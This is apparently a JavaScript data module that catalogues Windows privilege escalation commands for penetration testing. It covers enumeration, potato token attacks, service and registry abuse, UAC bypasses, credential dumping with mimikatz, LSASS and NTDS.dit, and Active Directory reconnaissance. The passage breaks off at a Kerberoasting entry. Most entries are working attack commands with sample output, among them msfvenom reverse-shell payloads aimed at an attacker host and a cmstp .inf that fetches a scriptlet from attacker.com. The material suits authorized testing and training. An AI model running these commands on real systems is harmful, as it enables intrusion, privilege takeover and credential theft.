// Windows Privilege Escalation Commands — comprehensive reference for ethical pentesting
// Educational reference for authorized security testing only.

export const WINDOWS_PRIVESC_COMMANDS = {
  systemEnumeration: [
    {
      technique: "System Information",
      category: "System Enumeration",
      command: "systeminfo",
      description: "Displays OS name, version, build, architecture, hotfixes, network config. Essential for identifying missing patches and kernel exploits.",
      example_output: "OS Name: Microsoft Windows Server 2019 Standard\nOS Version: 10.0.17763 N/A Build 17763\nSystem Type: x64-based PC\nHotfix(s): 4 Hotfix(s) Installed.\n  [01]: KB4534310\n  [02]: KB4516115",
      tools: ["systeminfo"],
      references: []
    },
    {
      technique: "Current User Privileges",
      category: "System Enumeration",
      command: "whoami /all",
      description: "Shows username, SID, group memberships, and all privileges. Critical for identifying token-based escalation (SeImpersonate, SeDebug, etc.).",
      example_output: "USER INFORMATION\n  User Name           SID\n  server\\svc_web      S-1-5-21-...\n\nPRIVILEGES INFORMATION\n  SeImpersonatePrivilege  Impersonate a client after authentication  Enabled\n  SeAssignPrimaryTokenPrivilege  Replace a process level token  Disabled",
      tools: ["whoami"],
      references: []
    },
    {
      technique: "Local Users",
      category: "System Enumeration",
      command: "net user",
      description: "List all local user accounts. Check for service accounts, admin accounts, and recently created users.",
      example_output: "User accounts for \\\\TARGET\n  Administrator  DefaultAccount  Guest  svc_web  WDAGUtilityAccount",
      tools: ["net"],
      references: []
    },
    {
      technique: "User Details",
      category: "System Enumeration",
      command: "net user Administrator",
      description: "Detailed info on a specific user including group memberships, password policy, last logon.",
      example_output: "User name                    Administrator\nFull Name\nAccount active               Yes\nPassword last set            1/1/2024 12:00:00 AM\nLocal Group Memberships      *Administrators\nGlobal Group memberships     *None",
      tools: ["net"],
      references: []
    },
    {
      technique: "Local Groups",
      category: "System Enumeration",
      command: "net localgroup",
      description: "List all local groups. Check Administrators, Remote Desktop Users, Backup Operators.",
      example_output: "*Administrators\n*Backup Operators\n*Remote Desktop Users\n*Users",
      tools: ["net"],
      references: []
    },
    {
      technique: "Administrators Group Members",
      category: "System Enumeration",
      command: "net localgroup Administrators",
      description: "List members of the Administrators group — these are your targets or allies.",
      example_output: "Members\n  Administrator\n  Domain Admins\n  svc_sql",
      tools: ["net"],
      references: []
    },
    {
      technique: "Running Processes",
      category: "System Enumeration",
      command: "tasklist /v",
      description: "List all running processes with verbose info including user context. Identify processes running as SYSTEM or admin users.",
      example_output: "Image Name        PID  Session  User Name           CPU Time\nsqlservr.exe     1234  Services NT AUTHORITY\\SYSTEM  0:05:30\napache.exe       5678  Services NT AUTHORITY\\LOCAL S  0:01:20",
      tools: ["tasklist"],
      references: []
    },
    {
      technique: "Network Connections",
      category: "System Enumeration",
      command: "netstat -ano",
      description: "List all network connections with PIDs. Find internal services, connections to other hosts, and listening ports.",
      example_output: "Proto  Local Address          Foreign Address        State           PID\nTCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5678\nTCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1234\nTCP    127.0.0.1:8080         0.0.0.0:0              LISTENING       9012",
      tools: ["netstat"],
      references: []
    },
    {
      technique: "Network Configuration",
      category: "System Enumeration",
      command: "ipconfig /all",
      description: "Full network config including DNS servers, DHCP, domain info. Identify dual-homed hosts for pivoting.",
      example_output: "Ethernet adapter Ethernet0:\n   IPv4 Address: 10.10.10.5\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 10.10.10.1\n   DNS Servers: 10.10.10.10",
      tools: ["ipconfig"],
      references: []
    },
    {
      technique: "Routing Table",
      category: "System Enumeration",
      command: "route print",
      description: "Display routing table. Identify reachable network segments for pivoting.",
      example_output: "Network Destination    Netmask          Gateway         Interface\n0.0.0.0                0.0.0.0          10.10.10.1      10.10.10.5\n172.16.0.0             255.255.0.0      10.10.10.1      10.10.10.5",
      tools: ["route"],
      references: []
    },
    {
      technique: "ARP Cache",
      category: "System Enumeration",
      command: "arp -a",
      description: "Show ARP table. Reveals other hosts on the network segment.",
      example_output: "Interface: 10.10.10.5\n  Internet Address      Physical Address\n  10.10.10.1            00-50-56-b9-1a-2b\n  10.10.10.10           00-50-56-b9-3c-4d",
      tools: ["arp"],
      references: []
    },
    {
      technique: "Installed Patches",
      category: "System Enumeration",
      command: "wmic qfe list brief",
      description: "List all installed Windows hotfixes/patches. Cross-reference with missing patch exploits.",
      example_output: "HotFixID   InstalledOn\nKB4534310  1/15/2024\nKB4516115  10/8/2023",
      tools: ["wmic"],
      references: []
    },
    {
      technique: "Installed Software",
      category: "System Enumeration",
      command: "wmic product get name,version",
      description: "List installed software and versions. Look for outdated applications with known exploits.",
      example_output: "Name                          Version\nMicrosoft SQL Server 2017     14.0.1000.169\nApache HTTP Server 2.4.29     2.4.29\n7-Zip 19.00                   19.00",
      tools: ["wmic"],
      references: []
    },
    {
      technique: "Scheduled Tasks",
      category: "System Enumeration",
      command: "schtasks /query /fo LIST /v",
      description: "List all scheduled tasks with details. Look for tasks running as SYSTEM with writable scripts/binaries.",
      example_output: "TaskName:    \\BackupTask\nRun As User: SYSTEM\nTask To Run: C:\\Scripts\\backup.bat\nSchedule Type: Daily",
      tools: ["schtasks"],
      references: []
    },
    {
      technique: "Services",
      category: "System Enumeration",
      command: "sc query state= all",
      description: "List all Windows services. Identify services running as SYSTEM with writable binaries or configs.",
      example_output: "SERVICE_NAME: CustomSvc\n  DISPLAY_NAME: Custom Service\n  STATE: RUNNING\n  SERVICE_TYPE: WIN32_OWN_PROCESS",
      tools: ["sc"],
      references: []
    },
    {
      technique: "Service Binary Paths",
      category: "System Enumeration",
      command: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\"",
      description: "Find non-standard services with auto-start. Check for unquoted paths and writable binary locations.",
      example_output: "CustomSvc  Custom Service  C:\\Program Files\\Custom App\\service.exe  Auto\nVulnSvc    Vuln Service    C:\\Program Files\\Vuln App\\svc.exe       Auto",
      tools: ["wmic"],
      references: []
    },
    {
      technique: "Registry AutoRun Programs",
      category: "System Enumeration",
      command: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      description: "Check programs that auto-start on login. If the binary path is writable, replace it with a payload.",
      example_output: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityApp    REG_SZ    C:\\Program Files\\Security\\app.exe",
      tools: ["reg"],
      references: []
    },
    {
      technique: "Search for Passwords in Files",
      category: "System Enumeration",
      command: "findstr /si password *.txt *.ini *.cfg *.config *.xml *.bat *.ps1",
      description: "Search current directory tree for files containing password strings.",
      example_output: "web.config:  <add key=\"dbPassword\" value=\"Passw0rd123!\" />\nsetup.ini:   password=admin123",
      tools: ["findstr"],
      references: []
    },
    {
      technique: "Search for Passwords in Registry",
      category: "System Enumeration",
      command: "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s",
      description: "Search the entire registry for values containing 'password'. Common place for stored credentials.",
      example_output: "HKEY_LOCAL_MACHINE\\SOFTWARE\\MyApp\n    DbPassword    REG_SZ    SuperSecret123",
      tools: ["reg"],
      references: []
    },
    {
      technique: "Stored Credentials",
      category: "System Enumeration",
      command: "cmdkey /list",
      description: "List Windows Credential Manager stored credentials. If entries exist, use runas /savecred to execute as that user.",
      example_output: "Target: Domain:interactive=WORKGROUP\\Administrator\n  Type: Domain Password\n  User: WORKGROUP\\Administrator",
      tools: ["cmdkey", "runas"],
      references: []
    },
    {
      technique: "RunAs with Saved Credentials",
      category: "System Enumeration",
      command: "runas /savecred /user:Administrator cmd.exe",
      description: "If cmdkey /list shows stored credentials for Administrator, use runas /savecred to spawn an admin cmd without needing the password.",
      example_output: "Attempting to start cmd.exe as user \"Administrator\"...",
      tools: ["runas"],
      references: []
    },
    {
      technique: "WiFi Passwords",
      category: "System Enumeration",
      command: "netsh wlan show profiles\nnetsh wlan show profile name=\"NetworkName\" key=clear",
      description: "Extract stored WiFi passwords in cleartext. May reveal corporate network credentials.",
      example_output: "Key Content            : WiFiPassword123!",
      tools: ["netsh"],
      references: []
    },
    {
      technique: "Unattend Files",
      category: "System Enumeration",
      command: "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Panther\\Unattend\\Unattend.xml 2>nul",
      description: "Search for unattended installation files that often contain local admin credentials in base64 or cleartext.",
      example_output: "C:\\Windows\\Panther\\Unattend\\Unattend.xml\n(contains <AutoLogon><Password><Value>base64password</Value>)",
      tools: ["dir", "type"],
      references: []
    },
    {
      technique: "IIS Web Config",
      category: "System Enumeration",
      command: "type C:\\inetpub\\wwwroot\\web.config 2>nul\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config 2>nul",
      description: "IIS web.config files often contain database connection strings with credentials.",
      example_output: "<connectionStrings>\n  <add connectionString=\"Server=localhost;Database=mydb;User Id=sa;Password=ReallyStrongPwd123\" />\n</connectionStrings>",
      tools: ["type"],
      references: []
    },
    {
      technique: "File Permissions Check",
      category: "System Enumeration",
      command: "icacls \"C:\\Program Files\\Custom App\\service.exe\"",
      description: "Check file/directory permissions. Look for BUILTIN\\Users:(F) or (M) on service binaries, scripts, or DLL directories.",
      example_output: "C:\\Program Files\\Custom App\\service.exe\n  BUILTIN\\Users:(I)(F)\n  NT AUTHORITY\\SYSTEM:(I)(F)\n  BUILTIN\\Administrators:(I)(F)",
      tools: ["icacls", "accesschk"],
      references: []
    },
    {
      technique: "AccessChk — Writable Services",
      category: "System Enumeration",
      command: "accesschk.exe -uwcqv \"Everyone\" * /accepteula\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Users\" * /accepteula",
      description: "Sysinternals AccessChk finds services writable by specific groups. SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG = privesc.",
      example_output: "RW CustomSvc\n  SERVICE_ALL_ACCESS",
      tools: ["accesschk"],
      references: ["https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"]
    }
  ],

  tokenAbuse: [
    {
      technique: "SeImpersonatePrivilege — JuicyPotato",
      category: "Token Abuse",
      command: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\temp\\rev.exe\" -t *",
      description: "Abuses SeImpersonatePrivilege via COM server impersonation. Works on Windows Server 2008–2016, Windows 7–10 (pre-1809). Needs a valid CLSID for the target OS.",
      example_output: "[+] CreateProcessWithTokenW OK\n(reverse shell as SYSTEM)",
      tools: ["JuicyPotato"],
      references: ["https://github.com/ohpe/juicy-potato"]
    },
    {
      technique: "SeImpersonatePrivilege — PrintSpoofer",
      category: "Token Abuse",
      command: "PrintSpoofer.exe -i -c cmd",
      description: "Abuses SeImpersonatePrivilege via print spooler named pipe impersonation. Works on Windows 10 and Server 2016/2019 where JuicyPotato fails.",
      example_output: "C:\\Windows\\system32>whoami\nnt authority\\system",
      tools: ["PrintSpoofer"],
      references: ["https://github.com/itm4n/PrintSpoofer"]
    },
    {
      technique: "SeImpersonatePrivilege — SweetPotato",
      category: "Token Abuse",
      command: "SweetPotato.exe -a \"cmd /c whoami > c:\\temp\\out.txt\"",
      description: "Combines multiple potato attacks (JuicyPotato, PrintSpoofer, EfsPotato) into one tool. Tries each method automatically.",
      example_output: "[+] Attempting PrintSpoofer...\n[+] Got SYSTEM token!\n[+] Running command...",
      tools: ["SweetPotato"],
      references: ["https://github.com/CCob/SweetPotato"]
    },
    {
      technique: "SeImpersonatePrivilege — GodPotato",
      category: "Token Abuse",
      command: "GodPotato.exe -cmd \"cmd /c whoami\"",
      description: "Works on Windows Server 2012–2022 and Windows 8.1–11. Most universal potato attack — works on nearly all modern Windows versions.",
      example_output: "[*] CombaseDisableManagement: true\n[*] AcquireToken...\nnt authority\\system",
      tools: ["GodPotato"],
      references: ["https://github.com/BeichenDream/GodPotato"]
    },
    {
      technique: "SeImpersonatePrivilege — RoguePotato",
      category: "Token Abuse",
      command: "RoguePotato.exe -r ATTACKER_IP -e \"cmd /c whoami\" -l 9999",
      description: "Requires an attacker-controlled machine to redirect OXID resolution. Works on Windows Server 2019 and Windows 10 1809+.",
      example_output: "[*] Received SYSTEM token\nnt authority\\system",
      tools: ["RoguePotato"],
      references: ["https://github.com/antonioCoco/RoguePotato"]
    },
    {
      technique: "SeImpersonatePrivilege — EfsPotato",
      category: "Token Abuse",
      command: "EfsPotato.exe \"cmd /c whoami\"",
      description: "Exploits the Encrypting File System (EFS) service for token impersonation. Works on many Windows versions.",
      example_output: "nt authority\\system",
      tools: ["EfsPotato"],
      references: ["https://github.com/zcgonvh/EfsPotato"]
    },
    {
      technique: "SeBackupPrivilege — Copy SAM/SYSTEM",
      category: "Token Abuse",
      command: "reg save HKLM\\SAM C:\\temp\\SAM\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n# On attacker: secretsdump.py -sam SAM -system SYSTEM LOCAL",
      description: "SeBackupPrivilege allows reading any file on the system. Save the SAM and SYSTEM hives, then extract password hashes with secretsdump.",
      example_output: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
      tools: ["reg", "secretsdump.py"],
      references: []
    },
    {
      technique: "SeBackupPrivilege — Robocopy Shadow Copy",
      category: "Token Abuse",
      command: "wmic shadowcopy call create Volume='C:\\'\nrobocopy /b \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS C:\\temp ntds.dit",
      description: "On a domain controller: create a shadow copy and use robocopy /b (backup mode) to copy NTDS.dit for offline hash extraction.",
      example_output: "(NTDS.dit copied — contains all domain password hashes)",
      tools: ["wmic", "robocopy", "secretsdump.py"],
      references: []
    },
    {
      technique: "SeRestorePrivilege — Overwrite Binary",
      category: "Token Abuse",
      command: "robocopy /b C:\\temp C:\\Windows\\System32 malicious.dll",
      description: "SeRestorePrivilege allows writing to any file. Replace a system DLL or service binary with a payload.",
      example_output: "(system binary replaced — code execution as SYSTEM on next use)",
      tools: ["robocopy"],
      references: []
    },
    {
      technique: "SeTakeOwnershipPrivilege",
      category: "Token Abuse",
      command: "takeown /f C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SAM /grant %username%:F\ncopy C:\\Windows\\System32\\config\\SAM C:\\temp\\",
      description: "SeTakeOwnershipPrivilege lets you take ownership of any object. Take ownership of SAM, grant yourself full control, then copy it.",
      example_output: "SUCCESS: The file (or folder): \"C:\\Windows\\System32\\config\\SAM\" now owned by user \"TARGET\\svc_web\".",
      tools: ["takeown", "icacls"],
      references: []
    },
    {
      technique: "SeLoadDriverPrivilege",
      category: "Token Abuse",
      command: "# Load a vulnerable driver (e.g., Capcom.sys) then exploit it for kernel code execution",
      description: "SeLoadDriverPrivilege allows loading kernel drivers. Load a known-vulnerable driver (Capcom.sys, RTCore64.sys) and exploit it for kernel-level code execution.",
      example_output: "(vulnerable driver loaded, kernel exploit executed, SYSTEM obtained)",
      tools: ["ExploitCapcom"],
      references: ["https://github.com/tandasat/ExploitCapcom"]
    },
    {
      technique: "SeDebugPrivilege — Dump LSASS",
      category: "Token Abuse",
      command: "procdump.exe -ma lsass.exe lsass.dmp\n# Or: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full",
      description: "SeDebugPrivilege allows debugging any process. Dump LSASS memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets.",
      example_output: "(lsass.dmp created — extract credentials with mimikatz: sekurlsa::minidump lsass.dmp)",
      tools: ["procdump", "mimikatz", "pypykatz"],
      references: []
    },
    {
      technique: "SeDebugPrivilege — Migrate to SYSTEM Process",
      category: "Token Abuse",
      command: "# In Meterpreter:\nmigrate <SYSTEM_PID>\n# Or with PowerShell token manipulation",
      description: "SeDebugPrivilege allows opening SYSTEM processes. Inject into or steal tokens from SYSTEM-level processes like winlogon.exe or services.exe.",
      example_output: "meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
      tools: ["meterpreter", "mimikatz"],
      references: []
    }
  ],

  serviceExploits: [
    {
      technique: "Unquoted Service Path",
      category: "Service Exploits",
      command: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'",
      description: "Find services with unquoted paths containing spaces. Windows tries each space-separated path component. Place a payload at the intermediate path.",
      example_output: "VulnSvc  Vulnerable Service  C:\\Program Files\\Vuln App\\service.exe  Auto\n# Place payload at: C:\\Program.exe or C:\\Program Files\\Vuln.exe",
      tools: ["wmic", "sc"],
      references: ["https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths"]
    },
    {
      technique: "Weak Service Permissions",
      category: "Service Exploits",
      command: "sc qc VulnSvc\naccesschk.exe -ucqv VulnSvc /accepteula\nsc config VulnSvc binpath= \"C:\\temp\\rev.exe\"\nsc stop VulnSvc\nsc start VulnSvc",
      description: "If you have SERVICE_CHANGE_CONFIG permission, change the service binary path to your payload and restart the service.",
      example_output: "[SC] ChangeServiceConfig SUCCESS\n(reverse shell as SYSTEM when service starts)",
      tools: ["sc", "accesschk"],
      references: []
    },
    {
      technique: "Writable Service Binary",
      category: "Service Exploits",
      command: "icacls \"C:\\Program Files\\Custom App\\service.exe\"\n# If writable:\nmove \"C:\\Program Files\\Custom App\\service.exe\" \"C:\\Program Files\\Custom App\\service.exe.bak\"\ncopy C:\\temp\\rev.exe \"C:\\Program Files\\Custom App\\service.exe\"",
      description: "If the service binary itself is writable by your user, replace it with a payload. The service runs as SYSTEM.",
      example_output: "(service binary replaced — SYSTEM shell on next service restart)",
      tools: ["icacls", "copy"],
      references: []
    },
    {
      technique: "DLL Hijacking",
      category: "Service Exploits",
      command: "# 1. Use Process Monitor to find DLLs the service tries to load but can't find (NAME NOT FOUND)\n# 2. Check if the search path includes a writable directory\n# 3. Place a malicious DLL with the expected name in that directory\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > hijack.dll",
      description: "Windows DLL search order: application directory → system directories → PATH. If a service loads a missing DLL and you can write to a directory in the search path, place your malicious DLL there.",
      example_output: "(DLL loaded by service on startup — code execution as SYSTEM)",
      tools: ["procmon", "msfvenom"],
      references: ["https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking"]
    },
    {
      technique: "Service Binary Replacement via sc",
      category: "Service Exploits",
      command: "sc config VulnSvc binpath= \"cmd /c net localgroup Administrators user /add\"\nsc stop VulnSvc\nsc start VulnSvc\n# Verify:\nnet localgroup Administrators",
      description: "Alternative to reverse shell: change the service binary to add your user to the Administrators group.",
      example_output: "The command completed successfully.\n(user is now in Administrators group)",
      tools: ["sc", "net"],
      references: []
    }
  ],

  registryExploits: [
    {
      technique: "AlwaysInstallElevated",
      category: "Registry Exploits",
      command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# If both return 0x1:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi",
      description: "If AlwaysInstallElevated is set to 1 in BOTH HKLM and HKCU, any user can install MSI packages as SYSTEM. Generate a malicious MSI with msfvenom.",
      example_output: "AlwaysInstallElevated    REG_DWORD    0x1\n(MSI installs as SYSTEM — reverse shell received)",
      tools: ["reg", "msfvenom", "msiexec"],
      references: []
    },
    {
      technique: "AutoRun Executables",
      category: "Registry Exploits",
      command: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n# Check if any referenced binary is writable:\nicacls \"C:\\path\\to\\autorun.exe\"",
      description: "Check AutoRun registry keys. If the executable is writable, replace it with a payload that runs on user logon.",
      example_output: "SecurityAgent    REG_SZ    C:\\Program Files\\Agent\\agent.exe\n(if writable, replace with payload)",
      tools: ["reg", "icacls"],
      references: []
    },
    {
      technique: "Stored Credentials in Registry",
      category: "Registry Exploits",
      command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword AutoAdminLogon\"\nreg query HKLM\\SOFTWARE\\RealVNC\\vncserver /v Password\nreg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions /s",
      description: "Search registry for auto-logon credentials, VNC passwords, PuTTY session configs with stored proxy passwords.",
      example_output: "DefaultUserName    REG_SZ    Administrator\nDefaultPassword    REG_SZ    Password123!\nAutoAdminLogon     REG_SZ    1",
      tools: ["reg"],
      references: []
    },
    {
      technique: "SAM and SYSTEM Backup Files",
      category: "Registry Exploits",
      command: "dir C:\\Windows\\Repair\\SAM C:\\Windows\\Repair\\SYSTEM 2>nul\ndir C:\\Windows\\System32\\config\\RegBack\\SAM C:\\Windows\\System32\\config\\RegBack\\SYSTEM 2>nul",
      description: "Check for backup copies of SAM and SYSTEM hives. These can be used to extract local password hashes offline.",
      example_output: "C:\\Windows\\System32\\config\\RegBack\\SAM\nC:\\Windows\\System32\\config\\RegBack\\SYSTEM\n(copy both and use secretsdump.py)",
      tools: ["dir", "secretsdump.py"],
      references: []
    }
  ],

  uacBypass: [
    {
      technique: "UAC Bypass — fodhelper.exe",
      category: "UAC Bypass",
      command: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\nfodhelper.exe\n# Cleanup:\nreg delete HKCU\\Software\\Classes\\ms-settings /f",
      description: "fodhelper.exe is an auto-elevating Microsoft binary. Set ms-settings protocol handler to your payload in HKCU (no admin needed). When fodhelper runs, it auto-elevates and launches your command.",
      example_output: "(elevated cmd.exe spawns without UAC prompt)",
      tools: ["reg", "fodhelper.exe"],
      references: ["https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/"]
    },
    {
      technique: "UAC Bypass — eventvwr.exe",
      category: "UAC Bypass",
      command: "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe\" /f\neventvwr.exe\nreg delete HKCU\\Software\\Classes\\mscfile /f",
      description: "eventvwr.exe is an auto-elevating binary that queries HKCU for the mscfile handler before HKLM. Set it to your payload for UAC bypass.",
      example_output: "(elevated cmd.exe spawns)",
      tools: ["reg", "eventvwr.exe"],
      references: ["https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/"]
    },
    {
      technique: "UAC Bypass — computerdefaults.exe",
      category: "UAC Bypass",
      command: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"powershell.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\ncomputerdefaults.exe\nreg delete HKCU\\Software\\Classes\\ms-settings /f",
      description: "Similar to fodhelper — computerdefaults.exe is auto-elevated and uses ms-settings protocol handler from HKCU.",
      example_output: "(elevated PowerShell spawns)",
      tools: ["reg"],
      references: []
    },
    {
      technique: "UAC Bypass — sdclt.exe",
      category: "UAC Bypass",
      command: "reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\nsdclt.exe\nreg delete HKCU\\Software\\Classes\\Folder /f",
      description: "sdclt.exe (Windows Backup) is auto-elevated. Hijack the Folder shell handler in HKCU for UAC bypass.",
      example_output: "(elevated cmd.exe spawns)",
      tools: ["reg", "sdclt.exe"],
      references: []
    },
    {
      technique: "UAC Bypass — cmstp.exe",
      category: "UAC Bypass",
      command: "# Create malicious .inf file:\n[version]\nSignature=$chicago$\n[DefaultInstall_SingleUser]\nUnRegisterOCXs=UnRegisterOCXSection\n[UnRegisterOCXSection]\n%11%\\scrobj.dll,NI,http://attacker.com/payload.sct\n# Then:\ncmstp.exe /au evil.inf",
      description: "CMSTP (Connection Manager Profile Installer) can load SCT files from a URL, bypassing UAC and application whitelisting.",
      example_output: "(payload executes in elevated context)",
      tools: ["cmstp.exe"],
      references: []
    }
  ],

  credentialHarvesting: [
    {
      technique: "Mimikatz — Dump Logon Passwords",
      category: "Credential Harvesting",
      command: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords",
      description: "The most famous credential extraction tool. Dumps plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Requires admin/SYSTEM.",
      example_output: "Authentication Id : 0 ; 999\n  msv :\n   [00000003] Primary\n   * Username : Administrator\n   * Domain   : TARGET\n   * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0\n   * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709\n  wdigest :\n   * Username : Administrator\n   * Password : P@ssw0rd123!",
      tools: ["mimikatz"],
      references: ["https://github.com/gentilkiwi/mimikatz"]
    },
    {
      technique: "Mimikatz — SAM Dump",
      category: "Credential Harvesting",
      command: "mimikatz.exe\nprivilege::debug\nlsadump::sam",
      description: "Dump local SAM database hashes. Works without domain controller access.",
      example_output: "RID  : 000001f4 (500)\nUser : Administrator\nHash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0",
      tools: ["mimikatz"],
      references: []
    },
    {
      technique: "Mimikatz — DCSync",
      category: "Credential Harvesting",
      command: "mimikatz.exe\nlsadump::dcsync /domain:target.local /user:krbtgt",
      description: "Simulate domain controller replication to extract any user's password hash from Active Directory. Requires Replicating Directory Changes privileges.",
      example_output: "Hash NTLM: a]b3cd4e5f6a7b8c9d0e1f2a3b4c5d6e\n(krbtgt hash — can forge Golden Tickets)",
      tools: ["mimikatz"],
      references: []
    },
    {
      technique: "Mimikatz — Kerberos Tickets",
      category: "Credential Harvesting",
      command: "mimikatz.exe\nprivilege::debug\nsekurlsa::tickets /export",
      description: "Export all Kerberos tickets from memory. Can be used for Pass-the-Ticket attacks.",
      example_output: "(TGT and TGS tickets exported as .kirbi files)",
      tools: ["mimikatz"],
      references: []
    },
    {
      technique: "Mimikatz — Token Elevation",
      category: "Credential Harvesting",
      command: "mimikatz.exe\nprivilege::debug\ntoken::elevate\nlsadump::sam",
      description: "Elevate to SYSTEM token, then dump SAM. Useful when running as admin but not SYSTEM.",
      example_output: "Token Id  : 0\nUser name : NT AUTHORITY\\SYSTEM\n(SAM hashes dumped)",
      tools: ["mimikatz"],
      references: []
    },
    {
      technique: "DPAPI Credential Extraction",
      category: "Credential Harvesting",
      command: "mimikatz.exe\ndpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\CREDENTIAL_FILE",
      description: "DPAPI protects Windows stored credentials, browser passwords, and certificates. Mimikatz can decrypt DPAPI blobs with the user's master key.",
      example_output: "TargetName     : Domain:target=server01\nUserName       : DOMAIN\\admin\nCredentialBlob : SuperSecretPassword!",
      tools: ["mimikatz"],
      references: []
    },
    {
      technique: "Browser Credential Extraction",
      category: "Credential Harvesting",
      command: "# Chrome: SharpChromium.exe\n# Firefox: firepwd.py\n# All browsers: LaZagne.exe all",
      description: "Extract saved passwords from web browsers. Chrome stores in SQLite with DPAPI encryption, Firefox in key4.db/logins.json.",
      example_output: "URL: https://mail.google.com\nUsername: admin@company.com\nPassword: MailP@ss123!",
      tools: ["LaZagne", "SharpChromium", "firepwd"],
      references: ["https://github.com/AlessandroZ/LaZagne"]
    },
    {
      technique: "Volume Shadow Copy — NTDS.dit",
      category: "Credential Harvesting",
      command: "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\n# On attacker: secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL",
      description: "On a domain controller: create a volume shadow copy to access the locked NTDS.dit (AD database). Extract all domain user hashes offline.",
      example_output: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::",
      tools: ["vssadmin", "secretsdump.py"],
      references: []
    }
  ],

  adAttacks: [
    {
      technique: "BloodHound Data Collection",
      category: "Active Directory",
      command: "SharpHound.exe -c All -d target.local\n# Or: bloodhound-python -u user -p password -d target.local -dc dc01.target.local -c All",
      description: "Collect Active Directory data for BloodHound graph analysis. Maps attack paths from current position to Domain Admin.",
      example_output: "Status: 133 name lookups, 0 failures\nOutput: 20240101120000_BloodHound.zip",
      tools: ["SharpHound", "bloodhound-python", "BloodHound"],
      references: ["https://github.com/BloodHoundAD/BloodHound"]
    },
    {
      technique: "PowerView — Domain Enumeration",
      category: "Active Directory",
      command: "Import-Module .\\PowerView.ps1\nGet-Domain\nGet-DomainController\nGet-DomainUser -AdminCount | select samaccountname\nGet-DomainGroup -AdminCount | select cn\nFind-LocalAdminAccess",
      description: "PowerView is the Swiss Army knife for AD enumeration. Identify domain admins, find computers where you have local admin, map trust relationships.",
      example_output: "samaccountname\n  Administrator\n  svc_sql\n  da-john",
      tools: ["PowerView"],
      references: ["https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"]
    },
    {
      technique: "Kerberoasting",
      category: "Active Directory",
